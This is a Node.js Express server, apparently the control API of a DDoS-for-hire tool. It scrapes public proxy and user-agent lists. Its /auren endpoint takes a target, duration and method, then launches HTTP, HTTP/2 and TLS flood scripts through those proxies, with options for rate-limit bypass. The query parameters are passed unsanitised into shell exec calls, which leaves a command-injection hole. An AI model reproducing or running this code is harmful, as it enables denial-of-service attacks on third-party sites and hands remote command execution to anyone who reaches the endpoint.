const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

const proxyUrls = [
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
  "https://multiproxy.org/txt_all/proxy.txt",
  "https://rootjazz.com/proxies/proxies.txt",
  "https://api.openproxylist.xyz/http.txt",
  "https://api.openproxylist.xyz/https.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
  "https://spys.me/proxy.txt"
];

async function scrapeProxy() {
  try {
    let allData = "";

    for (const url of proxyUrls) {
      try {
        const response = await fetch(url);
        const data = await response.text();
        allData += data + "\n";
      } catch (err) {
        console.log(`❌ Gagal ambil dari ${url}: ${err.message}`);
      }
    }

    fs.writeFileSync("proxy.txt", allData, "utf-8");
    console.log("Semua proxy berhasil disimpan ke proxy.txt");
  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
async function fetchData() {
  const ipServices = [
    { url: 'https://api.ipify.org?format=json', getIP: (data) => data.ip },
    { url: 'https://httpbin.org/get', getIP: (data) => data.origin },
    { url: 'https://ipinfo.io/json', getIP: (data) => data.ip },
    { url: 'https://api.my-ip.io/v2/ip.json', getIP: (data) => data.ip }
  ];
  
  for (const service of ipServices) {
    try {
      const response = await fetch(service.url);
      if (!response.ok) continue;
      
      const data = await response.json();
      const ip = service.getIP(data);
      if (ip) {
        console.log(`Copy : http://${ip}:${port}`);
        return { origin: ip };
      }
    } catch (error) {
      continue;
    }
  }
  
  console.log(`Server running on port ${port}`);
  return null;
}

app.get('/auren', (req, res) => {
  const { target, port, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly, By Xxx',
    target,
    port,
    time,
    methods
  });

  
       if (methods === 'HTTP-RAW') {
    exec(`node httpraw.js ${target} ${time}`);
    } else if (methods === 'BYPASS') {
    exec(`node h2-flood.js ${target} ${time} 32 2 proxy.txt`);
    exec(`node fast.js ${target} ${time} 2 32`);
    exec(`node bypass.js GET ${target} ${time} 2 32 proxy.txt --httpver "h2" --ratelimit true --randpath true --randrate true --debug true`);
    } else if (methods === 'H2-X') {
    exec(`node fast.js ${target} ${time} 4 64`);
    exec(`node tls.js ${target} ${time} 32 2 proxy.txt`);
        } else if (methods === 'H2-FLOOD') {
    exec(`node h2-flood.js ${target} ${time} 32 2 proxy.txt`);
    exec(`node fast.js ${target} ${time} 4 64`);
            } else if (methods === 'TLS') {
    exec(`node tls.js ${target} ${time} 32 2 proxy.txt`);
    exec(`node h2-flood.js ${target} ${time} 32 2 proxy.txt`);
            } else if (methods === 'FLOOD-X') {
    exec(`node flood-x.js ${target} ${time} 32 2 proxy.txt`);
    exec(`node h2-flood.js ${target} ${time} 32 2 proxy.txt`);
   } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  scrapeProxy();
  scrapeUserAgent();
  fetchData();
});
